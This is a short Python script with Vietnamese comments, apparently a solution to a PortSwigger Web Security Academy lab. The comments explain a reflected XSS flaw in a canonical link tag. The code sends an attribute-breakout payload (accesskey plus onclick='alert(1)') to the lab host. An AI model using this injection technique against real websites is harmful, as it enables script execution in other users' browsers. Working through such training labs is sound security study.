# Khi xem mã nguồn, chú ý đến việc web sử dụng Canonical
# Nó có tác dụng khai báo với các bộ máy tìm kiếm (như Google, Bing) đâu là URL gốc (bản chính) của một trang web
# Đặc biêt là khi ta chèn thêm ?q=x thì nó sẽ được chèn trưc tiếp vào mã nguồn gốc
# Điều này không phải là DOM do nó thay đổi trực tiếp mã nguồn gốc
# Thêm nữa là nếu ta chèn thêm 1 dấu ' vào sau thì nó thực sự thoát ra khỏi href của cannonical
# Hướng khai thác:
# Chúng ta sẽ chèn thêm 1 accesskey (kịch bản là người dùng sử dụng các phím tắt) từ đó kích hoạt lỗ hổng XSS qua event onclick
# payload:
# ?q='accesskey='x'onclick='alert(1)

import requests

burp0_url = "https://0a96008c038979c880de037a00e500fc.web-security-academy.net:443/?%27accesskey=%27x%27onclick=%27alert(1)"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

requests.get(burp0_url, headers=burp0_headers)